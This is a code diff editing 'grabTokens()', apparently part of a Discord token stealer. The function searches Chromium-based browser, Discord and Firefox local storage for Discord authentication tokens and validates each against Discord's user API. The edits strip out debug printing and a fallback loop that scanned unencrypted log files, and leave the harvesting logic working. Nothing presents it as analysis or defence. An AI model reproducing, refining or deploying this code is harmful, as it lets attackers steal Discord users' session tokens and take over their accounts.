@@ -90,7 +90,6 @@ def grabTokens():
         'Ungoogled Chromium': appdata + r'\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\'
     }
 
-    tokenfull = []
     for source, path in paths.items():
         if not os.path.exists(path):
             continue
@@ -106,12 +105,9 @@ def grabTokens():
                                 if r.status_code == 200:
                                     if token in tokens:
                                         continue
-                                    tokenfull.append(f"Source: {source} - Token:\n{token}")
                                     tokens.append(token)
-                                    print(source, token)
-                            except Exception as e:
-                                pass
-                    except:
+                    except Exception as e:
+                        print(e)
                         continue
         else:
             for file_name in os.listdir(path): # if it is discord...
@@ -126,31 +122,11 @@ def grabTokens():
                                 if r.status_code == 200:
                                     if token in tokens:
                                         continue
-                                    tokenfull.append(f"Source: {source} - Token:\n{token}")
                                     tokens.append(token)
-                                    print(source, token)
                             except Exception as e:
+                                print(e)
                                 continue
-                            
-            for file_name in os.listdir(path): # alternatively.. for now we also try unencrypted.. just to be sure
-                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                    continue
-                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                    try:
-                        for token in findall(regex, line):
-                            try:
-                                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
-                                if r.status_code == 200:
-                                    if token in tokens:
-                                        continue
-                                    tokenfull.append(f"Source: {source} - Token:\n{token}")
-                                    tokens.append(token)
-                                    print(source, token)
-                            except Exception as e:
-                                pass
-                    except:
-                        continue
-                        
+                                                    
     if os.path.exists(roaming+"\\Mozilla\\Firefox\\Profiles"): # ha, yeah.. firefox needs extra care lmfao.
         for path, _, files in os.walk(roaming+"\\Mozilla\\Firefox\\Profiles"):
             for _file in files:
@@ -163,10 +139,9 @@ def grabTokens():
                             if r.status_code == 200:
                                 if token in tokens:
                                     continue
-                                tokenfull.append(f"Source: {source} - Token:\n{token}")
                                 tokens.append(token)
-                                print(source, token)
                         except Exception as e:
+                            print(e)
                             pass
 
 ```
